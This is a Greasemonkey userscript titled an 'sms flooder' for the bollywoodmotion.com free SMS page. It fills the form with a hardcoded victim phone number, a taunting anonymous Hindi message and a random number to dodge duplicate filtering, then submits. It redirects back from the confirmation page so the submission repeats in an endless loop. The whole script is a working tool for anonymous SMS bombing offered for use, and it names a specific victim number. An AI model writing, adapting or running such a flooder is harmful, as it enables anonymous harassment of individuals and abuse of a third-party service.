// ==UserScript==
// @name          Anonymous BOLLYWOODMOTION.COM sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*bollywoodmotion.com/*
// ==/UserScript==

var victim=8092262928; //Enter victims number here
var msg="aur han msg padhne k baad ...mera number mat dhundna...wo to tumhe nahi milega...sochte raho msg kisne kiya aur kyon kiya....nd plz zyyaada tension mat lena..."; // Enter delay in milliseconds if required
var urname="TERA BAAP";

if(document.location=="http://www.bollywoodmotion.com/freesms/sms/sms.php"||document.location=="http://bollywoodmotion.com/freesms/sms/sms.php")
{
document.getElementsByName("name")[0].value=urname;
document.getElementsByName("mv")[0].value=victim;
document.getElementsByName("Message")[0].value=Math.floor(Math.random()*1456484)+"\n"+msg+Math.floor(Math.random()*1456484);
void(0);
document.forms[0].submit();
}


if(document.location=="http://www.bollywoodmotion.com/freesms/sms/sendsmsz.php")
document.location="http://www.bollywoodmotion.com/freesms/sms/sms.php"
